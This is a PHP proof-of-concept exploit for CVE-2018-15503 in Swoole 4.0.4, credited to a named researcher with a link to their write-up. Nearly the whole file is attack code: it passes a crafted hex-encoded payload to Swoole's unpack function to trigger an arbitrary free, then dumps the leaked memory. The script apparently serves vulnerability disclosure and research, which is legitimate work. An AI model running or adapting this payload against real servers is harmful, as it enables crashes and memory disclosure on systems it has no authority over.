<?php

//Evidence of an arbitrary free in Swoole 4.0.4 (more info in https://x-c3ll.github.io/posts/swoole-deserialization-cve-2018-15503/)
//Author: Juan Manuel Fernandez (@TheXC3LL)

// This PoC crash inside a call of zval_ptr_dtor (the free for zvals in PHP)

  $data = "e802ea7b02ea7b02227b0a010800737464436c61737301930470726f70414141410a010800737464436c6173730197c100414141410a010800737464436c6173730100c10041414141454f46";
  $obj = new \Swoole\Serialize();
	$sor = hex2bin($data);
	$ser = $obj->unpack($sor);
	echo "[+] Swoole Unserialized:\n";
	var_dump($ser);
	echo "[+] Memory Leaked:\n";
	$keys = key(get_object_vars($ser[1]));
	echo bin2hex($keys);
	echo "\n[+] Size: \n";
	echo strlen($keys);
?>
